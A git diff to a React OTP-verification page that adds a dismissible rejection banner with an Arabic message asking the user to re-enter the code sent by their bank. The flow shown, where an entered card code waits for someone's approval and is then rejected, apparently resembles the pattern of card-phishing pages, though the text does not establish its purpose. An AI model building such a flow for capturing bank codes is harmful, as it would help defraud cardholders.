@@ -7,6 +7,7 @@ import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 import { useLanguage } from "@/i18n/LanguageContext";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
+import RejectionBanner from "@/components/RejectionBanner";
 
 const OTPVerification = () => {
   const navigate = useNavigate();
@@ -22,6 +23,7 @@ const OTPVerification = () => {
   const [otp, setOtp] = useState("");
   const [loading, setLoading] = useState(false);
   const [waitingApproval, setWaitingApproval] = useState(false);
+  const [rejected, setRejected] = useState(false);
   const [orderId, setOrderId] = useState<string | null>(passedOrderId);
   const [timer, setTimer] = useState(120);
   const [canResend, setCanResend] = useState(false);
@@ -46,6 +48,7 @@ const OTPVerification = () => {
       toast.error(o.rejected);
       setWaitingApproval(false);
       setLoading(false);
+      setRejected(true);
     }
   }, [approvalStatus, orderId, navigate, offer, cardLastFour, o.verified, o.rejected]);
 
@@ -121,6 +124,11 @@ const OTPVerification = () => {
                   />
                 ) : (
                   <>
+                    <RejectionBanner
+                      show={rejected}
+                      message="رمز التحقق المُدخل غير صحيح أو منتهي. يرجى التأكد من الرمز المُرسَل من البنك وإعادة إدخاله بشكل صحيح."
+                      onDismiss={() => setRejected(false)}
+                    />
                     {/* Transaction Info */}
                     <div className="divide-y divide-border/60 rounded-2xl border border-border/60 bg-secondary/30">
                       {[
